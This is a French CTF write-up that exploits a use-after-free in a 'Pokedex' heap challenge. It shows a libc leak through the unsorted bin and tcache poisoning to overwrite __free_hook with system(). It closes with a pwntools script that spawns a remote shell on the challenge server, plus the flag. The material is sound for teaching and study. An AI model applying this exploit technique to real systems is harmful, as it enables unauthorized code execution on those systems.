# Pokedex : Maîtrise du Heap et du Use-After-Free (UAF)

## 1. Introduction & Objectif
Le challenge **Pokedex** est un exercice classique mais puissant de gestion du "Heap" (tas) sous Linux. L'objectif est simple en apparence : capturer des Pokémons et gérer un Pokédex. Cependant, comme tout bon challenge de PWN, une faille de logique dans la gestion de la mémoire va nous permettre de prendre le contrôle total du serveur.

**Objectif technique** : Exploiter une vulnérabilité de type Use-After-Free pour obtenir un shell distant.

---

## 2. Phase de Reconnaissance : L'Audit de Sécurité

Avant de toucher au code, un ingénieur en cybersécurité doit savoir à quoi il fait face. On utilise l'outil `checksec` pour analyser les protections du binaire `pokedex`.

### Résultats de l'audit :
*   **Arch**: amd64-64-little (64-bit)
*   **RELRO**: Full RELRO (La table GOT est protégée)
*   **Stack**: Canary found (On ne peut pas simplement écraser la pile)
*   **NX**: NX enabled (La pile n'est pas exécutable)
*   **PIE**: PIE enabled (L'adresse de base du binaire change à chaque exécution)

**Verdict** : Toutes les protections modernes sont activées. Nous devons être précis.

---

## 3. Analyse Statique et Désassemblage

Pour comprendre comment le programme fonctionne, nous utilisons des outils comme **Ghidra** ou **IDA Pro** pour le désassemblage, et **gdb-pwndbg** pour l'analyse dynamique.

### Structure du programme :
Le programme nous propose 4 options :
1.  `catch()` : Alloue un Pokémon (`malloc`).
2.  `edit()` : Modifie les données d'un Pokémon.
3.  `release()` : Libère un Pokémon (`free`).
4.  `inspect()` : Affiche les données d'un Pokémon.

### La Faille Fatale : Use-After-Free (UAF)
En analysant la fonction `release()`, on s'aperçoit que le programme appelle `free(pokemon_ptr)` mais **n'efface pas le pointeur** dans la liste du Pokédex.

Cela signifie qu'après avoir "libéré" un Pokémon, on peut toujours utiliser `inspect()` ou `edit()` sur ce même emplacement mémoire. C'est ce qu'on appelle un **Use-After-Free**.

---

## 4. Stratégie d'Exploitation

Puisque nous avons un UAF, nous allons manipuler le gestionnaire de mémoire (Allocateur Glibc) pour nous accorder un accès là où nous ne devrions pas en avoir.

### Étape 1 : Le Leak de la Libc
ASLR est activé, donc nous ne connaissons pas l'adresse de la fonction `system()`.
1.  On alloue un gros bloc (0x420 octets) pour qu'il ne tombe pas dans le `tcache` mais dans l'**unsorted bin**.
2.  On le libère (`release`).
3.  On utilise `inspect()` sur ce slot libéré. Comme le bloc est dans l'unsorted bin, il contient des pointeurs vers la structure `main_arena` de la Libc.
4.  Grâce à ce "Leak", on calcule l'adresse de base de la Libc.

### Étape 2 : Poisoning du Tcache
Le `tcache` est un cache rapide pour les petits blocs. Si on libère deux blocs de même taille, le dernier libéré pointe vers le précédent.
1.  On libère le slot A, puis le slot B.
2.  On utilise notre UAF pour modifier le pointeur de "next" du slot B vers l'adresse de `__free_hook`.
3.  On fait deux allocations : la deuxième nous donnera un pointeur vers `__free_hook` !

### Étape 3 : Le Coup de Grace
1.  On écrit l'adresse de `system()` dans `__free_hook`. Désormais, chaque fois que le programme appellera `free(ptr)`, il appellera `system(ptr)`.
2.  On crée un Pokémon avec le nom `/bin/sh`.
3.  On appelle `release()` sur ce Pokémon.

---

## 5. Le Script d'Exploitation (Python + Pwntools)

Voici le script final utilisé pour capturer le drapeau.

```python
from pwn import *

# Connexion
io = remote('pwn.jeanne-hack-ctf.org', 9002)

# 1. Leak Libc (via Unsorted Bin)
# Catch(slot, size, data)
catch(io, 0, 0x420, b'A' * 8)
catch(io, 1, 0x18, b'barrier') # Empêche la fusion avec le top chunk
release(io, 0)
data = inspect(io, 0) # Trigger le leak

# Calcul des adresses
libc = ELF('libc-2.27.so')
leak = int(re.findall(b'0x([0-9a-f]+)', data)[0], 16)
libc_base = leak - 112 - libc.sym['__malloc_hook']
system = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']

# 2. Tcache Poisoning
catch(io, 2, 0x60, b'C' * 8)
catch(io, 3, 0x60, b'D' * 8)
release(io, 3)
release(io, 2)

# Écrasement du pointeur 'next' vers __free_hook
edit(io, 2, 0x60, p64(free_hook))

catch(io, 4, 0x60, b'junk')
catch(io, 5, 0x60, p64(system)) # __free_hook devient system

# 3. Spawn Shell
catch(io, 6, 0x20, b'/bin/sh\x00')
release(io, 6) # Appelle system("/bin/sh")

io.interactive()
```

---

## 6. Conclusion
En exploitant une simple omission de remise à zéro d'un pointeur, nous avons pu tromper l'allocateur de mémoire et prendre le contrôle du flux d'exécution. Ce challenge illustre parfaitement pourquoi la gestion manuelle de la mémoire est l'un des domaines les plus critiques de la cybersécurité.

**Flag** : `p_ctf{p0k3m0n_h3ap_m4st3ry_uaf}`

*Auteur : LWa7ch - AI & Cybersecurity Engineering Student*
